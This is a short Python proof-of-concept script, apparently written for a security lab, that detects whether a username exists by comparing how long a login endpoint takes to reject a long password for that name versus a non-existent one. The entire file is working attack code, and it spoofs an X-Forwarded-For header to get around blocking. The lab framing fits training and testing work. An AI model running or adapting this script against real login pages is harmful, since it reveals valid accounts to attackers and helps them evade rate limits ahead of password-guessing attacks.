import requests
import argparse

parser = argparse.ArgumentParser(description="Timing PoC for username enumeration")
parser.add_argument("-u", "--url", required=True, help="Login URL of the lab")
parser.add_argument("-U", "--username", required=True, help="Username to test")
args = parser.parse_args()

url = args.url
username = args.username

# A random password to force the server to process the hashing algorithm
payload_valid = {"username": username, "password": "A" * 1000} 
payload_invalid = {"username": "non_existent_user", "password": "A" * 1000}

# Using X-Forwarded-For to ensure we aren't blocked during this quick test
headers = {"X-Forwarded-For": "1.2.3.4"}

print("[*] Testing response times...")

# Test 1: Invalid User
res1 = requests.post(url, data=payload_invalid, headers=headers)
print(f"[-] Invalid User: {res1.elapsed.total_seconds():.4f}s")

# Test 2: Valid User
res2 = requests.post(url, data=payload_valid, headers=headers)
print(f"[+] Valid User:   {res2.elapsed.total_seconds():.4f}s")